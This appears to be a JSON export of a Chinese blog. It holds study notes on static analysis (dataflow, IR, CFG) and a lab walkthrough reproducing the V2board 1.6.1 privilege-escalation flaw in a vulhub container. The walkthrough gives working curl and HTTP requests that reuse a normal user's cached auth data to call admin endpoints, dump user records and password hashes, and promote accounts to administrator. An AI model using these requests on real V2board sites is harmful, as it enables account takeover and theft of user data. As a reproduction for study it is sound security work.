Analysis：\n后面传递函数使用交，前面OUT[B]=U；全1；\n实列：\n\n0表示不可用，1表示可用。从上到下。。。看输出\n第一轮循环：初始化OUT全为1\nIN[B1]=00000，OUT[B1]=10000\nIN[B2]=OUT[B1] n OUT[B4]=10000，OUT[B2]=01010\nIN[B3]=01010，OUT[B3]=00011\nIN[B4]=01010，OUT[B4]=01110\nIN[B5]=OUT[B3] n OUT[B4]=00010，OUT[B5]=01010\n第二轮循环：上一轮OUT[B4]=01110\nIN[B1]=00000，OUT[B1]=10000\nIN[B2]=OUT[B1] n OUT[B4]=00000，OUT[B2]=01010\nIN[B3]=01010，OUT[B3]=00011\nIN[B4]=01010，OUT[B4]=01110\nIN[B5]=OUT[B3] n OUT[B4]=00010，OUT[B5]=01010\n循环图：\nAnalysis Comparsion：\n传递函数背下来。\n必会知识：了解三种数据流分析方式\n\nreaching definitions\nlive variables\navailable expressions\n\n能够说出三种分析的异同\n了解为什么while循环会停\n作业1： LIive variable analysis and iterative solver\n","slug":"南京大学软件分析-DFA-AP","date":"2022-12-21T12:50:14.000Z","categories_index":"软件分析","tags_index":"Java","author_index":"Longw"},{"id":"26fa7e60c2f997e6bbe4b4f8b6c9b6c8","title":"南京大学软件分析--IR","content":"\n\nB站教程地址：https://www.bilibili.com/video/BV1zE411s77Z/?spm_id_from=333.788&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n英文文档地址：https://pascal-group.bitbucket.io/lectures/IR.pdf\nTai-e作业文档地址：https://tai-e.pascal-lab.net/intro/overview.html\nIR：Intermediate Representation\nCompiler：\n源代码编译要经过图上几个步骤。首先进行词法分析，看内容是否符合要求。比如说使用正则表达式来验证。其次是进行语法分析，看语句的结构是否符合要求，比如使用上下文无关语法。再通过语义分析，看语句的含义是否符合要求，比如使用属性语法。之后再通过翻译器将其变成IR，这里的IR表示three-address code。而静态分析包括进行优化就是在转变成IR之后开始的。IR之前可以称为前端，IR之后称为后端。最后生成机器码。\nAST vs. IR：\n从AST和IR的结构看不同。AST接近于一般编程语言，IR类似于汇编。AST依赖各种语言，语言不同，结构树也不同。IR类似于汇编，各种语言都可以转换成IR的写法，所以IR不依赖语言。AST适合于快速类型检测，IR比较压缩和紧凑。AST的结构无法看到明显的控制流信息，IR则可以很容易看到控制流信息。由于以上的特性，IR通常被视为静态分析的基础。\nIR：\n三地址码的右边最多只有一个操作符。每个三地址码最多包含三个地址，类型可以是如图。每种指令都有自己的3AC格式。\n常见的3AC格式：\nSoot and Its IR：Jimple Soot’s IR is Jimple: typed 3-address code  \n开源的Java静态分析框架：https://github.com/soot-oss/soot\nsoot wiki：https://github.com/soot-oss/soot/wiki/Tutorials\n3AC Java代码实例：forloop：package nju.sa.examples;\npublic class FroLoop3AC&#123;\n    public static void main(String[] args)&#123;\n        int x&#x3D;0;\n        for(int i&#x3D;0;i&lt;10;i++)&#123;\n            x&#x3D;x+1;\n        &#125;\n    &#125;\n&#125;\n\n\nforloop 3AC：public static void main(java.lang.String[[])&#123;\n    java.loang.String[] r0;\n    int i1;\n    r0 :&#x3D; @parameter0: java.lang.String[];\n    i1&#x3D;0;\nlabel1:\n\tif i1&gt;&#x3D;10 goto label2;\n    i1&#x3D;i1+1;\n    goto label1;\nlabel2:\n\treturn;\n&#125;\n\ndowhile loop：package nju.sa.examples;\npublic class DoWhileLoop3AC&#123;\n    public static void main(String[] args)&#123;\n        int[] arr &#x3D;new int[10];\n        int 1&#x3D;0;\n        do&#123;\n            i&#x3D;i+!;\n        &#125;while(arr[i]&lt;10);\n    &#125;\n&#125;\n\ndowhile loop 3AC：public static void main(java.lang.String[])&#123;\n    java.langString[] r0;\n    int[] r1;\n    int $i0, i1;\n    r0 :&#x3D; @parameter0: java.lang.String[];\n    r1&#x3D;newarray(int)[10];\n    i1&#x3D;0;\nlabel1:\n\ti1&#x3D;i1+1;\n    $i0&#x3D;r1[i1];\n    if $i0&lt;10 goto label1;\n    return;\n&#125;\n\nMethod Call：package nju.sa.examples;\npublic class MethodCall3AC&#123;\n    String foo(String para1,String para2)&#123;\n        return para1+&quot; &quot; + para2;\n    &#125;\n\n    public static void main(String[] args)&#123;\n        MethodCall3AC mc &#x3D; new MethodCall3AC();\n        String result &#x3D;mc.foo(&quot;hello&quot;,&quot;world&quot;);s\n    &#125;\n&#125;\n\nMethod Call 3AC：java.lang.String foo(java.lang.String,java.lang.String&#123;\n    nju.sa.examples.MethodCall3AC r0;\n    java.lang.String r1,r2,$r7;\n    java.lang.StringBuilder $r3,$r4,$r5,$r6;\n    r0:&#x3D;@this: nju.sa.examples.MethodCall3AC;\n    r1:&#x3D;@parameter0: java.lang.String;\n    r2:&#x3D;@parameter1: java.lang.String;\n    $r3&#x3D;new java.lang.StringBuilder;\n    specialinvoke $r3.&lt;java.lang.StringBuilder: void &lt;init&gt;()&gt;();\n    $r4&#x3D;virtualinvoke $r3.&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)&gt;(r1);\n    $r5&#x3D;virtualinvoke $r4.&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)&gt;(&quot; &quot;);\n    $r6&#x3D;virtualinvoke $r5.&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)&gt;(r2);\n    $r7&#x3D;virtualinvoke $r6.&lt;java.lang.StringBuilder: java.lang.StringBuilder toString()&gt;();\n    return $r7;\n&#125;\n\npublic static void main(java.lang.String[])&#123;\n    java.lang.String[] r0;\n    nju.sa.examples.MethodCall3AC $r3;\n    r0 :&#x3D;@parameter0: java.lang.String[];\n    $r3 &#x3D; new nju.sa.examples.MethodCall3AC;\n    specialinvoke $r3.&lt;nju.sa.examples.MethodCall3AC: void &lt;init&gt;()&gt;();\n    virtualinvoke $r3.&lt;nju.sa.examples.MethodCall3AC:\n            java.lang.String foo(java.lang.String,java.lang.String)&gt;(&quot;hello&quot;,&quot;world&quot;);\n\n    return;\n&#125;\n\n&lt;&gt;里面是method signature：class name：return type method name(parameter1 type,parameter2 type,…)\n四种invoke：invokespecial：call constructor，ccall superclass methods，call private methods\ninvokevirutal：instance methods call（virtual dispatch）\ninvokeinterface：cannot optimization，checking interface implementation\ninvokestatic：call static methods\nJava7引进：invokedynamic-&gt;Java static typing，dynamic language runs on JVM\nClass：package nju.sa.examples;\npublic class Class3AC&#123;\n    public static final double pi&#x3D;3.14;\n    public static void main(String[] args)&#123;\n        \n    &#125;\n&#125;\n\nClass 3AC：public class nju.sa.examples.Class3AC extends java.lang.object&#123;\n    public static final double pi;\n    public void &lt;init&gt;()&#123;\n        nju.sa.examples.Class3AC r0;\n        r0:&#x3D;@this: nju.sa.examples.Class3AC;\n        specialinvoke r0.&lt;java.lang.object: void &lt;init&gt;()&gt;();\n        return;\n    &#125;\n\n\n\tpublic static void main(java.lang.String[])&#123;\n    \tjava.lang.String[] r0;\n   \t\tr0 :&#x3D;@parameter0: java.lang.String[];\n    \treturn;\n\t&#125;\n\n\tpublic static void &lt;clinit&gt;()&#123;\n    &lt;nju.sa.examples.Class3AC: double pi&gt;&#x3D;3.14;\n    return;\n\t&#125;\n&#125;\n\nclinit是类初始化的静态属性。类中有静态属性就会调用这个方法初始化。\nSSA：Static Single Assignment（SSA）\nSSA中所有赋值都指向不同的变量，每个定义一个新的名称，后续使用用前面定义的新名称，每个变量都有一个定义。\n变量在控制流合并时使用：\n\n有一个phi-function\nWhy (not) SSA?\n看文档翻译一下吧。\nControl Flow Analysis：\n通常参考控制流程图，CFG作为静态分析的基本结构，CFG中的节点可以是单独的3地址指令，或Basic Block。\nBasic Blocks（BB）：\nBasic Block有如下基本特征，只能在开头即第一条指令输入，只能在最后即最后一条指令退出。\ndesign basic blocks algotithm：\ngoto不是出口就是入口，一般表达式可作为结尾。\n如何做：\n\n第一条指令是入口，有条件或无条件跳转是入口，任何跟随有条件或无条件跳转的指令都是入口。\nBB以一个入口及后续所有指令组成，直到下一个入口。\n示例：\n结果：\n\nControl Flow Graph：CFG的节点是Basic Block\n存在block A到block B的边当且仅当：\n\n从A结尾到B的开头有条件或无条件的跳转，加边\nB按照原始指令顺序紧跟在A之后，且A不会以无条件跳转结束，加边\n\n普通跳转指令可以转变为跳转到basic block\n\n实列：\n流程看PPT。\n从3AC到CFG：\n必会知识点：•编译器与静态分析器之间的关系？\n•了解3AC及其常见形式？\n•如何在IR之上构建basic block？\n•如何在BBs之上构建控制流程图？\n","slug":"南京大学软件分析-IR","date":"2022-12-20T11:44:43.000Z","categories_index":"软件分析","tags_index":"Java","author_index":"Longw"},{"id":"d82e0720104dc3bfe88e058fc58082b0","title":"南京大学软件分析--介绍","content":"\n\nB站教程地址：https://www.bilibili.com/video/BV1b7411K7P4/?spm_id_from=333.999.0.0&amp;vd_source=6632b385bcaaeb6eb7c62e69b2587a3e\n英文文档地址：https://pascal-group.bitbucket.io/lectures/introduction.pdf\nTai-e作业文档地址：https://tai-e.pascal-lab.net/intro/overview.html\nPL：Programming Languages\nWhy we need static analysis？• Program Reliability Null pointer dereference, memory leak, etc. \n• Program Security Private information leak, injection attack, etc. \n• Compiler Optimization Dead code elimination, code motion, etc. \n• Program Understanding IDE call hierarchy, type indication, etc.  \nPice’s Theorem：目前编程语言写的程序，是不存在完美的静态分析方法的。\n non-trivial properties \n~= interesting properties \n~= the properties related with run-time behaviors of programs  \n也就是说，用静态分析方法去分析程序，可能分析结果超过（sound）真正的漏洞结果数目（truth），但是sound内的结果一定包含truth的结果，也就是在检测所有漏洞的基础上还存在多余的误报。也可能分析结果低于（complete）真正的漏洞结果数目（truth），但是complete的结果一定是truth里面的，也就是complete的检测结果都是正确的，可还是存在未能检测的漏洞。\nPerfect static analysis：\nUseful static analysis：前面Pice’s Theorem说了，不存在完美的静态分析。所以出现了useful static analysis（有用的静态分析）。\n分为两种，是or（或）关系：\n\nCompromise soundness（false negatives）妥协/损害 sound，存在漏报。也就是不再是全部包含正确漏洞结果并且多了。而是不完全包含正确漏洞存在错误的漏洞。\nCompromise completeness（false positives）妥协/损害 complete，存在误报。也就是结果不在全是正确的漏洞并且少了。而是不全是正确的漏洞存在错误的漏洞。\n\n\n注：这个图没有画出误报和漏报的范围\n在实际静态分析中，都是损害completeness。\n为什么实际分析都是Compromise completeness（存在误报）？在实际检测中如果不满足sound的检测是不完全的检测就可能会得出错误的结果：\n\n当只看蓝色路径会得出下面的类型转换是安全的，但是当将蓝色和绿色路径一起看也就是满足sound就会得出类型转换是不安全的。\n所以soundness在实际的静态分析中是及其重要的。满足soundness也就代表者存在误报的可能。\n静态and动态：用实际例子来描述什么是静态分析思维，什么是动态分析思维。\n\n给图中那段程序，现在要求分析的结果是1还是2？\n静态思维：只要要将所有结果列出不需要满足每个结果的条件，也就是2。\n动态思维：满足什么条件得到什么结果，也就是按照程序的行走路径得出结果，就是1。\n再有两种结果：\n\nx=1 or x=2 or x=….\nx=-1 or x=1 \n\n按照静态分析的角度，满足sound的就是正确的结果。所以3是正确的，4是错误的。\n图中的两种结果按照静态分析来看都是正确的，但是1的结果明显是更加精确，却会耗费更多的资源也就是更加昂贵。2的结果虽然不精确却不会耗费太多资源也就是更便宜。\n所以真实的静态分析就是在确保sound的情况下，对精度和速度做好有效的平衡。\nTwo Key Words：Abstraction：\n这个例子要分析代码中所有变量的符号。既然有代码，必然存在具体的符号相关代码，也就是具体域。而静态分析的Abstraction则是将代码中的具体域变成如图的抽象域。\n静态分析需要满足sound。前面的+，-，0都可以理解，后面的T符号表示未知，也就是在实际代码中v变量存在+或-两种情况，这两种情况都在正常符号范围内，所以定义成T。而最下面的变量v的表达式是w/0，这种表达式是错误的，所以其符号未定义，所以将其在抽象域中用undefined表示。这样就满足了静态分析的sound。\nOver-appproximation：Transfer Functions：这时近似的第一步，根据分析的问题定义传递函数，列出可能的表达式。最后将其运用到实际的代码中。\n\n按照上面的表达式，运用到实际的代码中：\n\n其中q是undefined，按照弹幕的说法是：错误就是bottom的。\n找出其中的漏洞，也就是存在问题的地方。为图上的1，2，3。其中1，2在验证后发现是正确的漏洞。而3在验证后是错误的漏洞，也就是误报。符合静态分析的定义。\nControl Flows：所有程序流汇聚的点要将其抽象。\n\n用的是最前面的那个列子。其中z=x+y是程序控制流的汇聚点，要将其抽象。它有两种可能，都是正确的符号，所以其抽象为T。\n因为实际情况下不可能枚举所有的可能，所以采用流合并的方式。\n","slug":"南京大学软件分析-介绍","date":"2022-12-20T07:58:53.000Z","categories_index":"软件分析","tags_index":"Java","author_index":"Longw"},{"id":"012af26b8a1c40c6035cf47689fa91dd","title":"V2board-1.6.1-提权漏洞","content":"\n\nvulhub靶场文章：https://github.com/vulhub/vulhub/blob/master/v2board/1.6-privilege-escalation/README.zh-cn.md\nPHP写的机场，就复现看看。\n原理就是认证使用了缓存里的信息，但是没有做好鉴权，导致一般用户可以访问后台管理员的接口。\n复现：复现就是注册普通用户帐号，获取认证信息，使用认证信息访问管理员接口。\n访问：http://IP:8080\n先注册一个账号 &#49;&#50;&#x33;&#x40;&#x31;&#x32;&#51;&#x2e;&#99;&#x6f;&#109;  12345678\n之后通过curl发包获取认证信息：\ncurl -i -s -k -XPOST --data-binary &quot;email&#x3D;123%40123.com&amp;password&#x3D;12345678&quot; http:&#x2F;&#x2F;192.168.0.110:8080&#x2F;api&#x2F;v1&#x2F;passport&#x2F;auth&#x2F;login\n\n\n返回：\n&#123;&quot;data&quot;:&#123;&quot;token&quot;:&quot;7a779e7eddb3fd2dbb1a3bed0d2d1ce6&quot;,&quot;auth_data&quot;:&quot;MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL&quot;&#125;&#125;\n\n其中auth_data就是认证信息\n之后发送数据包将auth_data先写入缓存中\nGET &#x2F;api&#x2F;v1&#x2F;user&#x2F;info HTTP&#x2F;1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: *&#x2F;*\nAccept-Language: en-US;q&#x3D;0.9,en;q&#x3D;0.8\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;106.0.5249.62 Safari&#x2F;537.36\nConnection: close\nAuthorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL\nCache-Control: max-age&#x3D;0\n\n写入之后，就可以携带认证信息访问管理员接口了\n访问用户列表：\nGET &#x2F;api&#x2F;v1&#x2F;admin&#x2F;user&#x2F;fetch HTTP&#x2F;1.1\nHost: 192.168.0.110:8080\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;108.0.0.0 Safari&#x2F;537.36\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\n\nAuthorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL\n\nCookie: CactiTimeZone&#x3D;480; cacti_remembers&#x3D;1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime&#x3D;Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga&#x3D;GA1.1.224987215.1671427330; _ga_P1E9Z5LRRK&#x3D;GS1.1.1671430011.2.0.1671430011.0.0.0\nConnection: close\n\n如图：\n\n其中id=1的就是管理员账号信息\n&#123;&quot;id&quot;:1,&quot;invite_user_id&quot;:null,&quot;telegram_id&quot;:null,&quot;email&quot;:&quot;admin@example.com&quot;,&quot;password&quot;:&quot;$2y$10$EdVbYLXrgSJe0I01O3demOnmEPUOFui6S8URXudWHc9474ajEvf7.&quot;,&quot;password_algo&quot;:null,&quot;password_salt&quot;:null,&quot;balance&quot;:0,&quot;discount&quot;:null,&quot;commission_type&quot;:0,&quot;commission_rate&quot;:null,&quot;commission_balance&quot;:0,&quot;t&quot;:0,&quot;u&quot;:0,&quot;d&quot;:0,&quot;transfer_enable&quot;:0,&quot;banned&quot;:0,&quot;is_admin&quot;:1,&quot;is_staff&quot;:0,&quot;last_login_at&quot;:null,&quot;last_login_ip&quot;:null,&quot;uuid&quot;:&quot;9a2fdbc7-b346-44f7-91a1-46d5da5612d8&quot;,&quot;group_id&quot;:null,&quot;plan_id&quot;:null,&quot;remind_expire&quot;:1,&quot;remind_traffic&quot;:1,&quot;token&quot;:&quot;0f49a4e5e1d9384593d24e63ef751c66&quot;,&quot;remarks&quot;:null,&quot;expired_at&quot;:0,&quot;created_at&quot;:1671426966,&quot;updated_at&quot;:1671426966,&quot;total_used&quot;:0,&quot;subscribe_url&quot;:&quot;http:\\&#x2F;\\&#x2F;192.168.0.110:8080\\&#x2F;api\\&#x2F;v1\\&#x2F;client\\&#x2F;subscribe?token&#x3D;0f49a4e5e1d9384593d24e63ef751c66&quot;&#125;\n\n但是密码是加密的，上面的数据现在密码没有加盐，有源码可以尝试找一下加密函数。\n尝试解密：在ResetPassword.php中找到了所使用的加密函数：password_hash()\n$user-&gt;password &#x3D; password_hash($password, PASSWORD_DEFAULT);\n$user-&gt;password_algo &#x3D; null;\n\n在php.net查找函数的使用：每次加密生成的密文不一样，第二个值默认是$2y$，写成PASSWORD_DEFAULT\n刚刚通过接口发现密码的salt值为null，也就是默认\n所以直接验证一下刚刚注册的密码：\n&lt;?php\n&#x2F;&#x2F;密码原文\n$a&#x3D;&#39;12345678&#39;;\n$b&#x3D;password_hash($a,PASSWORD_DEFAULT);\necho $b;\n\n&#x2F;&#x2F;通过接口返回的密码hash\n$c&#x3D;&quot;$2y$10$909cGrZuUAXvyioexr.GDOj64BDkC1Xy4R1Yofwxzw0gjEzza.x1K&quot;;\n\n&#x2F;&#x2F;随意测试密码hash\n$d&#x3D;&quot;$2y$10$sfdsfdsfdsfdsfdsfds.sdasdsadasdasdadsadsadasddasdasda&quot;;\n\n&#x2F;&#x2F;验证是否匹配\nif (password_verify($a, $c))&#123;\n   echo &quot;密码匹配&quot;.&quot;\\n&quot;;\n&#125;else&#123;  \n   echo &quot;密码错误&quot;.&quot;\\n&quot;;\n&#125;\n\n&#x2F;&#x2F;输出hash值的信息\n$e &#x3D; password_get_info ($b);\nvar_dump($e);\n\n?&gt;\n\npassword_verify就是用来验证密码原文和hash值是否是匹配的，前面说了每次密码生成的 密文是不一样的。\n找是找到了，但是这样除了爆破就没办法了。\n其实本来想直接看看有没有接口添加管理员的，但是p牛的这个环境没给管理员密码。\n爆破是想都不用想了，忘记密码显示可以进入容器重置密码\n在站点目录下执行命令找回密码\nphp artisan reset:password 管理员邮箱\n\n进入容器重置密码：\nsudo docker ps\nsudo docker exec -it xxxxxx &#x2F;bin&#x2F;bash\nphp artisan reset:password admin@example.com  #这个password是模块的意思\n重置密码：05136632d72e03fa7b2829dc0aa3f0d8\n\n修改账号权限：登录管理员账号，再来找一找接口\n用户添加接口：\nPOST &#x2F;api&#x2F;v1&#x2F;admin&#x2F;user&#x2F;generate HTTP&#x2F;1.1\nHost: 192.168.0.110:8080\nContent-Length: 55\nauthorization: YWRtaW5AZXhhbXBsZS5jb206JDJ5JDEwJEtnT2toLlJDdGpsMkhqYzl1MzBJSS5WR21mVm1EZGl0dDBoQ1N6Qjh0NEFRQ2RYSXdEL04u\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;108.0.0.0 Safari&#x2F;537.36\nContent-Type: application&#x2F;x-www-form-urlencoded\nAccept: *&#x2F;*\nOrigin: http:&#x2F;&#x2F;192.168.0.110:8080\nReferer: http:&#x2F;&#x2F;192.168.0.110:8080&#x2F;admin\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nCookie: CactiTimeZone&#x3D;480; cacti_remembers&#x3D;1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime&#x3D;Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga&#x3D;GA1.1.224987215.1671427330; dark_mode&#x3D;0; _ga_P1E9Z5LRRK&#x3D;GS1.1.1671432769.3.1.1671436123.0.0.0\nConnection: close\n\nemail_prefix&#x3D;a&amp;email_suffix&#x3D;admin.com&amp;password&#x3D;12345678\n\n用户设置为管理员：\nPOST &#x2F;api&#x2F;v1&#x2F;admin&#x2F;user&#x2F;update HTTP&#x2F;1.1\nHost: 192.168.0.110:8080\nContent-Length: 458\nauthorization: YWRtaW5AZXhhbXBsZS5jb206JDJ5JDEwJEtnT2toLlJDdGpsMkhqYzl1MzBJSS5WR21mVm1EZGl0dDBoQ1N6Qjh0NEFRQ2RYSXdEL04u\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;108.0.0.0 Safari&#x2F;537.36\nContent-Type: application&#x2F;x-www-form-urlencoded\nAccept: *&#x2F;*\nOrigin: http:&#x2F;&#x2F;192.168.0.110:8080\nReferer: http:&#x2F;&#x2F;192.168.0.110:8080&#x2F;admin\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nCookie: CactiTimeZone&#x3D;480; cacti_remembers&#x3D;1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime&#x3D;Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga&#x3D;GA1.1.224987215.1671427330; dark_mode&#x3D;0; _ga_P1E9Z5LRRK&#x3D;GS1.1.1671432769.3.1.1671436123.0.0.0\nConnection: close\n\nid&#x3D;4&amp;invite_user_id&#x3D;&amp;telegram_id&#x3D;&amp;email&#x3D;a%40admin.com&amp;password&#x3D;&amp;password_algo&#x3D;&amp;password_salt&#x3D;&amp;balance&#x3D;0&amp;discount&#x3D;&amp;commission_type&#x3D;0&amp;commission_rate&#x3D;&amp;commission_balance&#x3D;0&amp;t&#x3D;0&amp;u&#x3D;0&amp;d&#x3D;0&amp;transfer_enable&#x3D;0&amp;banned&#x3D;0&amp;is_admin&#x3D;1&amp;is_staff&#x3D;0&amp;last_login_at&#x3D;&amp;last_login_ip&#x3D;&amp;uuid&#x3D;a81a163c-cc6c-48d4-9189-ac4696eff82b&amp;group_id&#x3D;&amp;plan_id&#x3D;&amp;remind_expire&#x3D;1&amp;remind_traffic&#x3D;1&amp;token&#x3D;ae4d9b38b439c8d6c7c799dce821b78c&amp;remarks&#x3D;&amp;expired_at&#x3D;&amp;created_at&#x3D;1671436232&amp;updated_at&#x3D;1671436232\n\n这么多参数，只需要修改用户id和email就可以了，在前面的用户列表可以获取到这些数据\n接下来就来测试一下，用普通用户账号创建用户和管理员：\nPOST &#x2F;api&#x2F;v1&#x2F;admin&#x2F;user&#x2F;generate HTTP&#x2F;1.1\nHost: 192.168.0.110:8080\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;108.0.0.0 Safari&#x2F;537.36\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nAuthorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL\nCookie: CactiTimeZone&#x3D;480; cacti_remembers&#x3D;1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime&#x3D;Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga&#x3D;GA1.1.224987215.1671427330; _ga_P1E9Z5LRRK&#x3D;GS1.1.1671430011.2.0.1671430011.0.0.0\nConnection: close\nContent-Type: application&#x2F;x-www-form-urlencoded\nContent-Length: 55\n\nemail_prefix&#x3D;6&amp;email_suffix&#x3D;admin.com&amp;password&#x3D;12345678\n\n发包后返回true\n刷新后台页面可以看到以及添加用户\n\n当前权限\n\n在获取用户id\nGET &#x2F;api&#x2F;v1&#x2F;admin&#x2F;user&#x2F;fetch HTTP&#x2F;1.1\nHost: 192.168.0.110:8080\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;108.0.0.0 Safari&#x2F;537.36\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\n\nAuthorization: MTIzQDEyMy5jb206JDJ5JDEwJDkwOWNHclp1VUFYdnlpb2V4ci5HRE9qNjRCRGtDMVh5NFIxWW9md3h6dzBnakV6emEueDFL\n\nCookie: CactiTimeZone&#x3D;480; cacti_remembers&#x3D;1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime&#x3D;Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga&#x3D;GA1.1.224987215.1671427330; _ga_P1E9Z5LRRK&#x3D;GS1.1.1671430011.2.0.1671430011.0.0.0\nConnection: close\n\n修改用户权限为管理员：\nPOST &#x2F;api&#x2F;v1&#x2F;admin&#x2F;user&#x2F;update HTTP&#x2F;1.1\nHost: 192.168.0.110:8080\nContent-Length: 458\nauthorization: NkBhZG1pbi5jb206JDJ5JDEwJEd3SzNxOS9ZUVo2RHYyRzlXek44Yy5xbTg3L0k4SkFzUDZGQmIybXhpTVpwZGU3SlZrazd5\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;108.0.0.0 Safari&#x2F;537.36\nContent-Type: application&#x2F;x-www-form-urlencoded\nAccept: *&#x2F;*\nOrigin: http:&#x2F;&#x2F;192.168.0.110:8080\nReferer: http:&#x2F;&#x2F;192.168.0.110:8080&#x2F;admin\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nCookie: CactiTimeZone&#x3D;480; cacti_remembers&#x3D;1%2C0%2Cc7ab9885d183ad82e761c346f4e17c24adc94f618954735af0853262e24d2c85; CactiDateTime&#x3D;Thu Dec 15 2022 16:33:18 GMT+0800 (ä¸­å½æ åæ¶é´); _ga&#x3D;GA1.1.224987215.1671427330; dark_mode&#x3D;0; _ga_P1E9Z5LRRK&#x3D;GS1.1.1671432769.3.1.1671436123.0.0.0\nConnection: close\n\nid&#x3D;5&amp;invite_user_id&#x3D;&amp;telegram_id&#x3D;&amp;email&#x3D;6%40admin.com&amp;password&#x3D;&amp;password_algo&#x3D;&amp;password_salt&#x3D;&amp;balance&#x3D;0&amp;discount&#x3D;&amp;commission_type&#x3D;0&amp;commission_rate&#x3D;&amp;commission_balance&#x3D;0&amp;t&#x3D;0&amp;u&#x3D;0&amp;d&#x3D;0&amp;transfer_enable&#x3D;0&amp;banned&#x3D;0&amp;is_admin&#x3D;1&amp;is_staff&#x3D;0&amp;last_login_at&#x3D;&amp;last_login_ip&#x3D;&amp;uuid&#x3D;a81a163c-cc6c-48d4-9189-ac4696eff82b&amp;group_id&#x3D;&amp;plan_id&#x3D;&amp;remind_expire&#x3D;1&amp;remind_traffic&#x3D;1&amp;token&#x3D;ae4d9b38b439c8d6c7c799dce821b78c&amp;remarks&#x3D;&amp;expired_at&#x3D;&amp;created_at&#x3D;1671436232&amp;updated_at&#x3D;1671436232\n\n成功修改：\n\n其实流程是，注册账号，获取认证信息，让认证信息进入缓存，访问用户列表接口获取id值，访问接口修改为管理员。\n其中再次访问用户列表接口返回405，使用新账号的认证信息，再次测试还是返回405，有点小问题。多试几次应该就好了。\n还有一个坑，这个后台路径是能修改的。虽然接口还是一样的，能获取管理员账号，但是没有路径就不能登陆后台为所欲为了。\n所以还是找找其他接口把自己变成超级vip，长期有效的那种。这里就不看了。\n关闭环境：docker-compose down -v #关闭镜像 \ndocker images   #列出所有下载镜像 \ndocker rmi --force ID    